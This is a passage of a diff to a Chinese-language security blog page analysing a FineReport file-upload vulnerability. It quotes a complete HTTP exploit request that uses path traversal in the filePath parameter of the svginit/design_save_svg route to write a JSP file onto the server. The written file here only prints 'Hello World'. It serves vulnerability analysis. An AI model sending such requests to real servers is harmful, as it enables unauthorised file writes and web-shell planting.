@@ -219,6 +219,9 @@ var _hmt = _hmt || [];
       </div>
     </div>
     <html><head></head><body><h2 id="前言">前言<a class="post-anchor" href="#前言"></a></h2><p>好久没写博客了 博客源文件找不到了233 假期重新抄了下顺便换了个博客主题<br>经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件 显而易见一堆人不分析就传exp 还说只能覆盖文件 今天又看到一篇一模一样的文章)</p>
+<span id="more"></span>
+
+
 <h2 id="分析">分析<a class="post-anchor" href="#分析"></a></h2><p>帆软官方提供了安装包下载地址 下载之<br><a target="_blank" rel="noopener" href="https://www.finereport.com/product/download">https://www.finereport.com/product/download</a><br>发现这是个java开发的web应用 先准备工具好工具反编译class<br>随手拿个网上给出的playload 看一下路由操作 op svginit,cmd design_save_svg</p>
 <figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1<br>Host: 192.168.10.1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE<br>Connection: close<br>Content-Type:text/xml;charset=UTF-8<br><br>Content-Length: 74<br><br>{"__CONTENT__":"&lt;%out.println(\"Hello World!\");%&gt;","__CHARSET__":"UTF-8"}<br></code></pre></td></tr></tbody></table></figure>
 
